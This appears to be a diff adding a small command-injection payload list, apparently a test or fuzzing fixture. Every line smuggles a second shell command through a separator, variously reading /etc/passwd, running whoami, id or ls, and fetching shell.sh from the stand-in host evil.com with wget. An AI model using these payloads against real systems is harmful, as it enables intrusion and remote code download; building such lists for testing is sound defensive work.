@@ -1,0 +1,5 @@
+; cat /etc/passwd
+| whoami
+`id`
+$(ls -la)
+; wget http://evil.com/shell.sh
